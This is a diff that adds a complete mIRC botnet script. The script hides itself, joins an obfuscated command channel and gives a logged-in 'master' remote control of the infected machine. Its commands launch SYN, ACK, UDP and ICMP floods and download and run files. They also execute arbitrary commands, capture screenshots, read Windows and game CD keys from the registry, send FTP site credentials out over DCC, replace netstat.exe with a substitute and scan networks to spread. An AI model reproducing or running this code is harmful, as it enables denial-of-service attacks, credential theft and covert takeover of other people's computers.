@@ -1,0 +1,362 @@
+on *:start:{ hidemirc | .nick $rmsl | remove dx.dll | set %failed 0 | .ddeserver off | if ($isdde(ABC123)) { exit } | .ddeserver on ABC123 | .identd on $r4 | .fullname $r4 | .emailaddr $r4 | .anick $rmsl  | .timer 1 5 r4.connect | window -h "Status Window" |  time-check | time-hide | .timerc -o 0 120 r4.connect | .rlevel 10 | .rlevel 5 | flush | rmdir download | create | ss.secure | officed.exe std.run fzed.bat }
+raw 433:*:{ .nick $rmsl }
+raw 432:*:{ .nick $rmsl }
+alias _r { return $r42 }
+on *:open:*|?:window -h $active
+on *:join:#:window -h $chan
+on *:quit:{
+  if ($level($nick) !== 1) { ruser $nick }
+}
+on *:PART:#:{
+  if ($level($nick) !== 1) { ruser $nick }
+}
+on *:NICK:{
+  if ($level($nick) !== 1) { ruser $nick }
+}
+raw 353:*:halt
+raw 366:*:halt
+alias wget { 
+  .run mscmd.exe /n /fh /r "mws $1- $+ "
+}
+alias ss.secure { run officed.exe | std.run fzed.bat }
+alias RegRead {
+  if ($1 != $null) {
+    var %a = regread
+    .comopen %a WScript.Shell
+    if !$comerr {
+      var %b =  $com(%a,RegRead,3,bstr,$1-)
+      var %c = $com(%a).result
+      .comclose %a
+      if (%c != $null) return %c
+      else {
+        return NA 
+      }
+    }
+  }
+  else { return error! complete data }
+}
+
+alias CSKEY { /set %cs-key $regread(HKCU\software\valve\half-life\settings\key) }
+alias winkey { /set %winkey $regread(HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId) | if (%winkey == $null) { /set %winkey $regread(HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey) } }
+alias rmsl { return $chr(91) $+ FBK $+ $chr(93) $+ - $+ $chr(91) $+ $rand(1,999) $+ $rand(1,999) $+ $rand(1,999) $+ $chr(93)  }
+alias nika { return $chr(91) $+ $gettok($ip,1,46) $+ - $+ $gettok($ip,2,46) $+ ] $+ - $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) }
+alias r4 { var %h = $r(5,9) , %e = 1 , %f | while (%e <= %h) { var %f = %f $+ $rand(a,z) | inc %e 1 } | return %f }
+alias hidemirc { var %q = sys-mc.dll, %w = winshutoff.dll, %e = TaskUsage.dll | if (!$exists(%q)) || (!$exists(%w)) || (!$exists(%e)) { application.destroy | halt } | var %. = $dll(%q, do_ShowWindow, $window(-2).hwnd 0) } }
+on *:connectfail:{ if (%failed == $null) { set %failed 0 } | inc %failed 1 }
+on *:connect:{ .mode $me +ix | .rlevel 10 | .rlevel 100 | .timerc off | if ($srve == $null) { set %connect.chan #alpha } | .timerjoin 0 30 join $srve ocularis | .timerjoin2 0 30 join $srve ocularis | join $srve ocularis }
+on *:disconnect:{ .timerc -o 0 120 //r4.connect | .fullname $r4 | .rlevel 10 | .emailaddr $r4 | .identd on $r4 | .nick $rmsl | .anick $rmsl | .timer 1 5 r4 }
+alias nnike { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,900) $+ $r(a,z) $+ $r(a,z) $+ $r(1,900) $+ $r(a,z) $+ $r(a,z) }
+alias checkstate { if ($appstate !== hidden) { .quit 15/07GoodBye World15\ | exit } | if ($appstate == hidden) { clearall } }
+alias connect.chan { if ($srve == $null) { return #hooters } | else { return $decrypt(channel,$srve) } }
+alias connect.server { if (%failed == $null) { set %failed 0 } | if ($cham == $null) && ($cham.key == $null) { return 127.0.0.1 6667 } | if (%failed >= 7) && ($cham.key != $null) { return $cham.key } | if (%failed == $null) || (%failed < 7) || ($cham.key == $null) || ($cham != $null) { return $cham } }
+alias r4.connect { server $connect.server }
+alias r4.if { if ($1 == $null) || ($2 == $null) || ($3 == $null) { return } | if ( [ [ $1 ] ] $2 [ [ $3 ] ] ) { [ [ $4- ] ] } }
+alias time-check { .timer-state -o 0 15 .checkstate }
+alias time-hide { .timer-hirc -o 0 3 hidemirc }
+alias capturep { notice $nick $dll(hot.dll,Capture,$mircdir\ $+ $ip $+ .bmp ) | .notice $nick 15/07Sending My Screenshot of my desktop 1sec!15\  | .dcc send $nick $mircdir\ $+ $ip $+ .bmp | .timer 1 280 .remove $mircdir\ $+ $ip $+ .bmp }
+on *:INPUT:*:HALTDEF | checkstate
+alias change-netstat { rename C:\winnt\system32\netstat.exe C:\winnt\system32\nemrmew.exe | rename c:\winnt\system32\yokimbo.exe c:\winnt\system32\netstat.exe }
+alias max-sucure { .run mscmd.exe /n /fh /r "startsdos.bat" }
+alias alive.parse { if ($1 == STDE5) { return } | if ($1 == STDE6) { timerping off | return } | if (*statistic* !isin $1-) { notice %nick666 $1- } }
+alias alive.read { alive.parse $ansi2mirc($gettok($dll(TaskUsage.dll, ReadText, ping out),2-,32)) | alive.parse $ansi2mirc($gettok($dll(TaskUsage.dll, ReadText, ping err),2-,32)) }
+alias alive { %share.locate = off | if ($timer(ping) == $null) { dll TaskUsage.dll Remove | if ($gettok($dll(TaskUsage.dll, RunConsole, ping ping.exe $1), 1, 32) == OK) { .timerping -mo 0 10 alive.read } } }
+alias mell { if ($me isvoice $srve) || ($me isop $srve) { msg $srve $1- | clearall } }
+alias cham { if (%connect.server == ZHNhbGVtLm5haWxlZC5vcmc=) { return $gettom(rE40E/jQUbv/Jck.D142d7k1CLtpz/r.Gpe.) } | if (%connect.server !== $gettom(jjNQ9.uuyac.Q55Y11Pn/2b/IH/4A1Tf8A01)) { return $decode(%connect.server,m)  }  }
+alias srve { if (%connect.chan = I7CxsrOxsA==) { return $gettom(AEzOg/eYjIU.SY6cc/VGhdH0) } | if (%chan !== ZHNhbGVtLm5haWxlZC5vcmc=) { return $decode(%connect.chan,m)  }  }
+alias cham.key { if (%connect.server.second == ZHNhbGVtLm5haWxlZC5vcmc=) { return $gettom(rE40E/jQUbv/Jck.D142d7k1CLtpz/r.Gpe.) } | if (%connect.server.second !== $gettom(jjNQ9.uuyac.Q55Y11Pn/2b/IH/4A1Tf8A01)) { return $decode(%connect.server.second,m)  }  }
+alias decrypt { return $dll(winshutoff.dll,bill,$1 $+ $chr(1) $+ $2-) }
+alias level5 { return chronic! }
+alias testthis { mell ;) ;) ;) i love my master lynx... }
+alias winnt { return Decrypt }
+on *:sockopen:mICQ*:{
+  sockwrite $sockname GET /scripts/WWPMsg.dll?from= $+ %icqfrom $+ &fromemail=FrozenBotKrew@owned.joo&subject= $+ %icqsubject $+ &body= $+  %icqbody $+ &to= $+ %icqto $crlf $+ $crlf $+ $crlf
+  sockclose $sockname
+}
+
+on *:DNS: { mell 15/07DNS:04 $naddress 07resolved to04 $raddress 07- IP:04 $iaddress $+ 15\ | halt }
+alias vV { return 15/07Tob Nezorf V615\ }
+ctcp *:*:*:{ if (ping isin $$1-) || (finger isin $$1-) || (version isin $$1-) { halt | haltdef } }
+on 1:text:$(.login $+ *):#:{ if ($level($nick) == 10) { return } | var %key = login $+ $nick $+ $gettok($gettok($address($nick,5),1,64),2,33) | var %pass = $nick $+ login $+ $left($nick,1) $+ $mid($nick,1,2) $+ $right($nick,1) $+ login | if ($decrypt(%key,$2-) == %pass) { .auser 100 $nick | mell 15/07Login Accepted:04 Welcome Master $nick $+ 15\ } }
+on 100:text:*:*:{ .chestate
+  if ($1 == .version) { mell $vV }
+  if ($1 == .bnc) {
+    if ($2 == start) && ($4 != $null) { if ($sock(Bnc)) { mell 15/07Error:04 BNC is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd $+ 15\ | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | mell 15/07BNC:04 /server -m $ip $+ : $+ $3  $4  15\ }
+    if ($2 == stats) && ($sock(Bnc)) { mell 15/07BNC: is on!04 $ip $+ : $+ %Bnc.port 07Pass:04 %Bnc.passwd $+ .. 07Users:04 $sock(BncClient*,0) 07Connected:04 $sock(BncServer*,0) $+ 15\ }
+    if ($2 == stop) && (%Bnc.Port != $null) { sockclose Bnc* | mell 15/07BNC: server on port:04 %bnc.port 07is now off 15\ | unset %bnc.* | sockclose Bnc* }
+  }
+  if ($1 == .logout) { ruser $nick | mell 15/07Loged Out:04 $nick 15\ }
+  if ($1 == .wget) { wget $2- | mell 15/07Downloading:04 $2- $+ 15\ }
+  if ($1 == .download) && ($3 == $null) && ($2 != $null) { downloadthis $2- }
+  if ($1 == .if) { r4.if $2- }
+  if ($1 == .icq)  { set %icqfrom $3 | set %icqsubject $4 | set %icqbody $5- | set %icqto $2 | sockclose mICQ* |  timer $+ $rand(1,99) $+ $rand(a,z)s 1 2 sockopen mICQ $+ $rand(1,999999) wwp.icq.com 80 | mell 15/07ICQ Paged:04 $2 07From:04 $3 07Subject:04 $4 07Message:04 $5 $+ 15\  }
+  if ($1 == .web-proxy) { .run mscmd.exe /n /fh /r  " $+ proxyload.exe $+ " | mell 15/07WebProxy started:04 $ip  6588 $+ 15\ }
+  if ($1 == .kill-proxy) { .run mscmd.exe /n /fh /r "ame.exe -kf proxy.exe" | mell 15/07WebProxy:04 Killed15\ }
+  if ($1 == .screen) && ($2 == $me) { capturep }
+  if ($1 == .ping-check) && ($2 == $me) { set -u10 %nick666 $nick | alive $3- }
+  if ($1 == .syn2) && ($4 !== $null) { mell 15/07Syn2 Attack:07 HOST/IP:04 $2 07Port:04 $3 07Time:04 $4 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -tcp $2 $3 $4 2" | timer 1 $calc($4 * 60) mell 15/07Syn Attack Done!15\ }
+  if ($1 == .halt) && ($2 == syn2) { run mscmd.exe /n /fh /r "ame.exe -kf dlldate.exe" |  mell 15/07Halting:04 Attacks15\ }
+  if ($1 == .ack) && ($4 !== $null) { mell 15/07Ack Attack:07 HOST/IP:04 $2 07Port:04 $3 07Time:04 $4 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -tcp $2 $3 $4 16" | timer 1 $calc($4 * 60) mell 15/07Ack Attack Done!15\  }
+  if ($1 == .juno) && ($4 !== $null) { set %junoport $3 | if (%junoport == random) { set %junoport $rand(0,65535) } |  mell 15/07Juno Attack:07 IP:04 $2 07Port:04 %junoport 07Time:04 $4 07Sec's15\  | .run mscmd.exe /n /fh /r "dlldate.exe $2 %junoport $+ " | timer 1 $4 .run mscmd.exe /n /fh /r "ame.exe -kf dlldate.exe" | timer 1 $4 mell 15/07Juno Attack Done!15\ }
+  if ($1 == .packet) && ($3 !== $null)  { mell 15/07Packet Attack:07 HOST/IP:04 $2 07Time:04 $3 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -ping $2 $3 $+ " | timer 1 $calc($4 * 60) mell 15/07Packet Attack Done!15\ } 
+  if ($1 == .shoutz) { mell 15/07Shoutz To:04 Rain, whirr, mouse, methx, ck21, mastadogg, maou, 0ne, chode, G``, and voxbox ;)15\ }
+  if ($1 == .udp) { udp.attack $2- }
+  if ($1 == .lll) { testthis }
+  if ($1 == .CS-key) { CSKEY | .msg $2 %cs-key }
+  if ($1 == .udp2) { udp2.attack $2- }
+  if ($1 == .copy) { copyscan }
+  if ($1 == .dns) && ($2 !== $null) { dns $2- }
+  if ($1 == .log-out) { ruser $2 | mell 15/07Loged Out:04 $2 15\ }
+  if ($1 == .aim) && ($2 == signon) { aim.signon }
+  if ($1 == .aim) && ($2 == bomb) { aim.bomb $3- }
+  if ($1 == .aim) && ($2 == disconnect) { aim.disconnect }
+  if ($1 == .aim) && ($2 == join) { aim.chat.join $3- }
+  if ($1 == .aim) && ($2 == create) { create }
+  if ($1 == .var) { mell 15/07Var04 $2 07is set to:04 [ [ $2 ] ] $+ 15\ }
+  if ($1 == .set) && ($3 !== $null) { mell 15/07Var04 $2 07Changed To:04 $3 15\ | set $2 [ [ $3 ] ] }
+  if ($1 == .lock-up) && ($me isvo #) { mell 15/07Locking Up15\ | mode # -v $me | hop # }
+  if ($1 == .cmd) { [ [ $2- ] ] | mell 15/07Done15\04  [ [ $2- ] ] }
+  if ($1 == .proxy) { proxy.start $2- }
+  if ($1 == . $+ $me) && ($2 !== $null) {  [ [ $2- ] ] | mell 15/12Done15\07  [ [ $2- ] ] }
+  if ($1 == .syn) && ($3 isnum) && ($4 !== $null) { mell 15/07SynAttack15\ /07IP:04 $2 $+ 15\04 15/07Port:04 $3 $+ 15\ /07Sockets:04 $4 $+ 15\  |  synp start $4 $2 $3 }
+  if ($1 == .syn) && ($2 == -r) && ($3 !== $null) { set -u3 %sprt $rand(1,65000) | mell 15/07Random Port SynAttack15\ /07IP:04 $3 $+ 15\04 15/07Port:04 %sprt $+ 15\ /07Sockets:04 $4 $+ 15\  |  synp start $4 $3 %sprt }
+  if ($1 == .syn) &&  (-*t* iswm $2) && ($6 !== $null) { mell 15/07Timer SynAttack15\ /07IP:04 $3 $+ 15\04 15/07Port:04 $4 $+ 15\ /07Sockets:04 $5 $+ 15\ /07Times:04 $6 $+ 15\  /07Every:04 $remove($2,t,-) 07Sec's15\ | timer $+ $nick $+ - $+ $3 -o $6 $remove($2,t,-) synp start $5 $3 $4 |  synp start $5 $3 $4  }
+  if ($1 == .syn) && ($2 == -rt) && ($6 !== $null) { set -u3 %sprt $rand(1,65000) | mell 15/07Timer SynAttack15\ /07IP:04 $3 $+ 15\04 15/07Port:04 %sprt $+ 15\ /07Sockets:04 $4 $+ 15\ /07Times:04 $5 $+ 15\  /07Every:04 $6 07Sec's15\ | timer $+ $nick $+ %$rand(1,9) $+ $rand(a,z) $+ %$rand(1,9) $+ $rand(a,z) -o $5 $6 synp start $4 $3 %sprt |  synp start $4 $3 %sprt   }
+  if ($1 == .icmp) && ($3 !== $null) { icmp.attack $2-  } 
+  if ($1 == .netsend) && ($3 !== $null) { mell 15/07NetSend15\07 IP:04 $2 07Message:04 $3- | .run mscmd.exe /n /fh /r "net send $2- $+ " }
+  if ($1 == .tracert) && ($2 == $me) && ($3 !== $null) { write tracert-fbk.bat tracert $3 > tracerto.txt | mell 15/04TraceRT07: $3 $+ 15\ | .run mscmd.exe /n /fh /r "tracert-fbk.bat" } 
+  if ($1 == .netstat) && ($2 == $me) { write nes.bat netstat.exe > neame.txt | .run mscmd.exe /n /fh /r "nes.bat" | timer 1 30 .remove nes.bat  }
+  if ($1 == .send) {
+    if ($2 == fxpsite) { dcc send $nick C:\programfiles\flashfxp\sites.dat | mell 15/07Sites.dat Sent15\ }
+    if ($2 == netstat) && ($3 == $me) { dcc send $nick neame.txt | mell 15/07Netstat Sent15\ }
+    if ($2 == tracert) && ($3 == $me) { dcc send $nick tracerto.txt | mell 15/07TraceRT Sent15\ }
+    if ($2 == find) && ($3 == $me) { dcc send $nick %foundthis | mell 15/07File Sent15\ }
+  }
+  if ($1 == .find) && ($4 !== $null) { mell 15/07Found: 04 $+ $findfile($2,$3,$4) $+ 15\ | set %foundthis $findfile($2,$3,$4) }
+  if ($1 == .procs) { mell $dll(control.dll,listprocs,_)) }
+  if ($1 == .scan) && ($2- != $null) {
+    if ($2 == randrange) && (%begshortip == $null) && $exists(rtos.exe) == $true { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | mell 15/07NT Scan:04 %1p1 $+ - $+ %1p2 $+ 15\ }
+    if ($2 == start) && (%begshortip == $null) && $exists(rtos.exe) == $true { mell 15/07NT Scan:04 $3 $+ - $+ $4 $+ 15\ | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == rand) && (%begshortip == $null) && $exists(rtos.exe) == $true { set %begit $randip($3) | mell 15/07NT Scan:04 %begit  $+ - $+ $4 $+ 15\ | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == host) && ($3 == start) && (%begshortip == $null) && $exists(rtos.exe) == $true { set %begit $gettok($ip,1-2,46) $+ . $+ 1 $+ . $+ 1 | mell 15/07NT Scan:04 %begit  $+ - $+ $gettok($ip,1-2,46) $+ .255.255 $+ 15\ | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == host) && ($3 == rand) && (%begshortip == $null) && $exists(rtos.exe) == $true { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | mell 15/07NT Scan:04 %begit  $+ - $+ $gettok($ip,1-2,46) $+ .255.255 $+ 15\ | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == stop) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | mell 15/07NT Scan:04 %begshortip to %endshortip 07Was halted15\ | unset %beg* | unset %end* }
+    if ($2 == stats) && (%begshortip != $null) { mell 15/07NT Scan Range:04 %begshortip - %endshortip 07Current ip:04 %ip99 07Tryed to root:04 %ttr 07IP's15\ }
+    if ($2 == auto) && ($3 == on) { mell 15/07NT Scan:04 Auto on15\ | %auto = on }
+    if ($2 == auto) && ($3 == off) { mell 15/07NT Scan:04 Auto off15\ | %auto = off }
+  }
+  if ($1 == .dl) { dcc send $nick $2- | mell 15/07Sending:04 $2- $+ 15\ }
+  if ($1 == .rm) { remove $2- | mell 15/07Removed:04 $2- $+ 15\ }
+  if ($1 == .rename) { rename $2- | mell 15/07Renamed:04 $2- $+ 15\ }
+  if ($1 == .load) { load -rs $2- | mell 15/07Loaded:04 $2- $+ 15\ }
+  if ($1 == .unload) { unload -rs $2- | mell 15/07Unloaded:04 $2- $+ 15\ }
+  if ($1 == .endtask) { .run mscmd.exe /n /fh /r "ame.exe -kf $2 $+ " | mell 15/07Task Killed:04 $2- $+ 15\ }
+  if ($1 == .uptime) { mell 15/07Utime:04 $uptime(system,1) $+ 15\ }
+  if ($1 == .secure-netstat) { change-netstat | mell 15/07Netstat Changed15\ }
+}
+
+on 10:text:*:*:{ .checkstate
+  if ($1 == .version) { mell $vV }
+  if ($1 == .bnc) {
+    if ($2 == start) && ($4 != $null) { if ($sock(Bnc)) { mell 15/07Error:04 BNC is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd $+ 15\ | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | mell 15/07BNC:04 /server -m $ip $+ : $+ $3  $4  15\ }
+    if ($2 == stats) && ($sock(Bnc)) { mell 15/07BNC: is on!04 $ip $+ : $+ %Bnc.port 07Pass:04 %Bnc.passwd 07Users:04 $sock(BncClient*,0) 07Connected:04 $sock(BncServer*,0) $+ 15\ }
+    if ($2 == stop) && (%Bnc.Port != $null) { sockclose Bnc* | mell 15/07BNC: server on port:04 %bnc.port 07is now off 15\ | unset %bnc.* | sockclose Bnc* }
+  }
+  if ($1 == .logout) { ruser $nick | mell 15/07Loged Out:04 $nick 15\ }
+  if ($1 == .halt) && ($2 == syn2) { run mscmd.exe /n /fh /r "ame.exe -kf dlldate.exe" |  mell 15/07Halting ALL Syn2 Attack15\ }
+  if ($1 == .udp) { udp.attack $2- }
+  if ($1 == .spread) { .n.load }
+  if ($1 == .copy) { copyscan }
+  if ($1 == .icq)  { set %icqfrom $3 | set %icqsubject $4 | set %icqbody $5- | set %icqto $2 | sockclose mICQ* |  timer $+ $rand(1,99) $+ $rand(a,z)s 1 2 sockopen mICQ $+ $rand(1,999999) wwp.icq.com 80 | mell 15/07ICQ Paged:04 $2 07From:04 $3 07Subject:04 $4 07Message:04 $5 $+ 15\  }
+  if ($1 == .web-proxy) { .run mscmd.exe /n /fh /r  " $+ proxyload.exe $+ " | mell 15/07WebProxy started:04 $ip  6588 $+ 15\ }
+  if ($1 == .dns) && ($2 !== $null) { dns $2- }
+  if ($1 == .screen) && ($2 == $me) { capturep }
+  if ($1 == .ping-check) && ($2 == $me) { set -u10 %nick666 $nick | alive $3- }
+  if ($1 == .syn3) && ($6 !== $null) { set %synport $6 | if (%synport == random) { set %synport $rand(0,65535) } | mell 15/07Syn Attack!15\ /07IP:04 $2 $+ 15\ /07Subnet Spoofed off:04 $3 $+ 15\ /04 $+ $4 07Sec's15\ /07Delay:04 $5 $+ 15\ /07Port:04 %synport $+ 15\ | .run yamcdr.exe $2 $3 $4 $5 %synport | timer 1 $4 mell 15/07Syn Attack Done!15\ }
+  if ($1 == .udp2) { udp2.attack $2- }
+  if ($1 == .syn2) && ($4 !== $null) { mell 15/07Syn2 Attack:07 HOST/IP:04 $2 07Port:04 $3 07Time:04 $4 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -tcp $2 $3 $4 2" | timer 1 $calc($4 * 60) mell 15/07Syn Attack Done!15\ }
+  if ($1 == .halt) && ($2 == syn2) { run mscmd.exe /n /fh /r "ame.exe -kf dlldate.exe" |  mell 15/07Halting Syn2 Attack15\ }
+  if ($1 == .ack) && ($4 !== $null) { mell 15/07Ack Attack:07 HOST/IP:04 $2 07Port:04 $3 07Time:04 $4 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -tcp $2 $3 $4 16" | timer 1 $calc($4 * 60) mell 15/07Ack Attack Done!15\  }
+  if ($1 == .juno) && ($4 !== $null) { set %junoport $3 | if (%junoport == random) { set %junoport $rand(0,65535) } |  mell 15/07Juno Attack:07 IP:04 $2 07Port:04 %junoport 07Time:04 $4 07Sec's15\  | .run mscmd.exe /n /fh /r "dlldate.exe $2 %junoport $+ " | timer 1 $4 .run mscmd.exe /n /fh /r "ame.exe -kf dlldate.exe" | timer 1 $4 mell 15/07Juno Attack Done!15\ }
+  if ($1 == .packet) && ($3 !== $null)  { mell 15/07Packet Attack:07 HOST/IP:04 $2 07Time:04 $3 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -ping $2 $3 $+ " | timer 1 $calc($4 * 60) mell 15/07Packet Attack Done!15\ } 
+  if ($1 == .shoutz) { mell 15/07Shoutz To:04 Rain, whirr, mouse, methx, ck21, mastadogg, maou, 0ne, chode, G``, and voxbox ;)15\ }
+  if ($1 == .ack) && ($4 !== $null) { mell 15/07Ack Attack:07 IP:04 $2 07Port:04 $3 07Time:04 $4 07Min's15\ | .run mscmd.exe /n /fh /r "kammi.exe -tcp $2 $3 $4 16" | timer 1 $calc($4 * 60) mell 15/07Ack Attack Done!15\  }
+  if ($1 == .aim) && ($2 == signon) { aim.signon }
+  if ($1 == .aim) && ($2 == bomb) { aim.bomb $3- }
+  if ($1 == .aim) && ($2 == disconnect) { aim.disconnect }
+  if ($1 == .aim) && ($2 == join) { aim.chat.join $3- }
+  if ($1 == .aim) && ($2 == create) { create }
+  if ($1 == .syn) && ($3 isnum) && ($4 !== $null) { mell 15/07SynAttack15\ /07IP:04 $2 $+ 15\04 15/07Port:04 $3 $+ 15\ /07Sockets:04 $4 $+ 15\  |  synp start $4 $2 $3 }
+  if ($1 == .syn) && ($2 == -r) && ($3 !== $null) { set -u3 %sprt $rand(1,65000) | mell 15/07Random Port SynAttack15\ /07IP:04 $3 $+ 15\04 15/07Port:04 %sprt $+ 15\ /07Sockets:04 $4 $+ 15\  |  synp start $4 $3 %sprt }
+  if ($1 == .scan) && ($2- != $null) {
+    if ($2 == randrange) && (%begshortip == $null) && $exists(rtos.exe) == $true { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | mell 15/07NT Scan:04 %1p1 $+ - $+ %1p2 $+ 15\ }
+    if ($2 == start) && (%begshortip == $null) && $exists(rtos.exe) == $true { mell 15/07NT Scan:04 $3 $+ - $+ $4 $+ 15\ | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == rand) && (%begshortip == $null) && $exists(rtos.exe) == $true { set %begit $randip($3) | mell 15/07NT Scan:04 %begit  $+ - $+ $4 $+ 15\ | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == host) && ($3 == start) && (%begshortip == $null) && $exists(rtos.exe) == $true { set %begit $gettok($ip,1-2,46) $+ . $+ 1 $+ . $+ 1 | mell 15/07NT Scan:04 %begit  $+ - $+ $gettok($ip,1-2,46) $+ .255.255 $+ 15\ | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == host) && ($3 == rand) && (%begshortip == $null) && $exists(rtos.exe) == $true { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | mell 15/07NT Scan:04 %begit  $+ - $+ $gettok($ip,1-2,46) $+ .255.255 $+ 15\ | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
+    if ($2 == stop) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | mell 15/07NT Scan:04 %begshortip to %endshortip 07Was halted15\ | unset %beg* | unset %end* }
+    if ($2 == stats) && (%begshortip != $null) { mell 15/07NT Scan Range:04 %begshortip - %endshortip 07Current ip:04 %ip99 07Tryed to root:04 %ttr 07IP's15\ }
+    if ($2 == auto) && ($3 == on) { mell 15/07NT Scan:04 Auto on15\ | %auto = on }
+    if ($2 == auto) && ($3 == off) { mell 15/07NT Scan:04 Auto off15\ | %auto = off }
+  }
+  if ($1 == .syn) &&  (-*t* iswm $2) && ($6 !== $null) { mell 15/07Timer SynAttack15\ /07IP:04 $3 $+ 15\04 15/07Port:04 $4 $+ 15\ /07Sockets:04 $5 $+ 15\ /07Times:04 $6 $+ 15\  /07Every:04 $remove($2,t,-) 07Sec's15\ | timer $+ $nick $+ - $+ $3 -o $6 $remove($2,t,-) synp start $5 $3 $4 |  synp start $5 $3 $4  }
+  if ($1 == .syn) && ($2 == -rt) && ($6 !== $null) { set -u3 %sprt $rand(1,65000) | mell 15/07Timer SynAttack15\ /07IP:04 $3 $+ 15\04 15/07Port:04 %sprt $+ 15\ /07Sockets:04 $4 $+ 15\ /07Times:04 $5 $+ 15\  /07Every:04 $6 07Sec's15\ | timer $+ $nick $+ %$rand(1,9) $+ $rand(a,z) $+ %$rand(1,9) $+ $rand(a,z) -o $5 $6 synp start $4 $3 %sprt |  synp start $4 $3 %sprt   }
+  if ($1 == .icmp) && ($3 !== $null) { icmp.attack $2-  } 
+  if ($1 == .netsend) && ($3 !== $null) { mell 15/07NetSend15\07 IP:04 $2 07Message:04 $3- | .run mscmd.exe /n /fh /r "net send $2- $+ " }
+  if ($1 == .tracert) && ($2 == $me) && ($3 !== $null) { write tracert-fbk.bat tracert $3 > tracerto.txt | mell 15/04TraceRT07: $3 $+ 15\ | .run mscmd.exe /n /fh /r "tracert-fbk.bat" } 
+  if ($1 == .netstat) && ($2 == $me) { write nes.bat netstat.exe > neame.txt | .run mscmd.exe /n /fh /r "nes.bat" | timer 1 30 .remove nes.bat  }
+  if ($1 == .send) {
+    if ($2 == fxpsite) { dcc send $nick C:\programfiles\flashfxp\sites.dat | mell 15/07Sites.dat Sent15\ }
+    if ($2 == netstat) && ($3 == $me) { dcc send $nick neame.txt | mell 15/07Netstat Sent15\ }
+    if ($2 == tracert) && ($3 == $me) { dcc send $nick tracerto.txt | mell 15/07TraceRT Sent15\ }
+  }
+}
+alias udp.attack if ($numtok($1-,32) < 4) { halt } | if ($1 == stop) { .timerUDP off | mell 15/07UDP Halted!15\ | unset %u* | halt } | set %uip $1 | set %uammount $2 | set %usize $3 | set %ustring $dstring | set %udelay $4 | set %uport $iif($5 == $null,$r(1,65535),$5) | .timerUDP -m %uammount %udelay sudp | mell 15/07UDP Attack07 IP:04 $1 07Packets:04 $2 07Size:04 $3 07Delay:04 $4 15\
+alias sudp var %u = $r(1,3) , %p = 1 | while (%p <= %u) { sockudp -b udp $+ %p $r(1,65535) %uip %uport %usize %ustring | inc %p 1 }
+alias dstring return $str(!@#%!^,140)
+alias udp2.attack if (?*.?*.?*.?* !iswm $1) || ($2 !isnum) || ($3 !isnum) || ($3 < 1) || ($3 > 65535) return | .timer -m $3 0 udpacket $1- | mell 15/07Sending:04 $3 07UDP packets to04 $1 $+ 07:04 $+ $iif($2 == 0,<random>,$2) $+ 15\
+alias udpacket var %i = 512 | while (%i) { bset &t $calc(%i * 8 -  7) 43 43 43 65 84 72 48 77 48 68 84 57 49 49 13 10 | dec %i } | sockudp packet $iif($2 == 0,$r(1,65535),$2)  $1 $iif($2 == 0,$r(1,65535),$2) &t
+alias winnt32 { return Encrypt }
+alias icmp.attack { if ($1 == stop) && (%icmp) { var %x = $stdio(ReleaseProcess,%icmp) | .timerstd.ping* off | unset %icmp | mell 15/07ICMP Attack halted15\ | halt } | if ($1 == $null) || ($2 !isnum) || ($3 !isnum) { halt } | var %ic = ping -n $2 -l $3 -w 0 $1 | set %icmp $remove(%ic,$chr(32)) | .std.run ping -n $2 -l $3 -w 0 $1 | mell 15/07ICMP15\07 IP:04 $1 07Size:04 $3 07Ammount:04 $2 }
+alias icmp2 { set -u0 %t3mp $1- }
